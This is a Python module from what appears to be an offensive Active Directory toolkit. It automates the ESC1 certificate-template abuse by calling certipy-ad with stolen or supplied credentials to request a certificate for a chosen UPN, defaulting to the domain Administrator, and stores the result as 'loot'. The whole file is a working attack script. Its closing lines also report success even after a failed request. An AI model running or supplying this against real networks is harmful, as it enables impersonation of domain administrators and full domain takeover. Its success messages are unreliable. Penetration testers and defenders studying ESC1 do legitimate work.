# modules/adcs/esc1.py

import os
from core.helpers import run_command, save_loot
from core.colors import red, green, yellow, blue

def abuse_esc1(session, template_name):
    print(blue(f"[*] Attempting ESC1 abuse using template: {template_name}"))

    cas = session.adcs_metadata.get("cas", [])
    if not cas:
        print(red("[-] No CA information available in session metadata. Run 'adcs enum' first."))
        return

    ca_name = cas[0].get("name")
    if not ca_name or ca_name.lower() == "n/a":
        print(red("[-] CA name is missing or invalid."))
        return
    
    default_upn = f"Administrator@{session.domain}"
    upn = input(f"[?] Enter target UPN [default: {default_upn}]: ").strip() or default_upn

    output_file = f"esc1_{template_name}.pfx"

    cmd = [
        "certipy-ad", "req",
        "-u", session.username,
        "-p", session.password,
        "-dc-ip", session.dc_ip,
        "-template", template_name,
        "-ca", ca_name,
        "-out", output_file,
        "-upn", upn
    ]

    print(blue(f"[*] Requesting certificate using template '{template_name}' and CA '{ca_name}'..."))
    output, err = run_command(" ".join(cmd))

    if err:
        print(yellow(f"[!] Certipy returned error:\n{err.strip()}"))

    if os.path.exists(output_file):
        with open(output_file, "rb") as f:
            data = f.read()
        save_loot(output_file, data, binary=True)
        print(green(f"[+] Certificate saved to loot/{output_file}"), flush=True)
    else:
        print(red("[-] Certificate file not found after request."), flush=True)

    print(green(f"[+] Certificate request successful!"))
    print(green(f"[+] Certificate saved to: loot/{output_file}"))
    print(green(f"[+] UPN used: {upn}"))
